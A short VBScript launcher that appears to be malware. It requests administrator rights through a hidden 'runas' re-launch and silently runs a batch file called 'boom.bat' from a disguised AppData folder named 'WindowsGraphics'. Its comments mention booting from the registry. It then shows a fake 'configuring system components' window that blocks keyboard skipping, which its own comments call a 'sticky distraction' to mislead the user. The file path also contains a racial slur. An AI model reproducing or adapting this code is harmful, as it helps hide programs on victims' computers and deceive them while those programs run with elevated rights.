Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Set the folder path
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\"
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION LOGIC ---
' Only ask for Admin if we are NOT booting from the registry
If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("boot") Then
    ' 0 = Hide the initial process
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: THE BACKGROUND STRIKE ---
' This runs your boom.bat (which starts your 6 apps)
' 0 = Completely Hidden, False = Run in background immediately
If FSO.FileExists(strPath & "boom.bat") Then
    WshShell.Run "cmd.exe /c boom.bat", 0, False
End If

' --- STEP 3: THE STICKY DISTRACTION ---
' This opens the VISIBLE window the user sees.
' color 1f = Professional Blue background with White text
' /nobreak = ignores keyboard input (User can't tap space to skip)
' > nul = hides the "Waiting for 30 seconds" text
' 1 = Visible window, True = VBScript waits for this window to finish
WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Please wait, configuring system components... && echo  This may take a few minutes. Do not close this window. && timeout /t 30 /nobreak > nul", 1, True

' --- STEP 4: EXIT ---
WScript.Quit
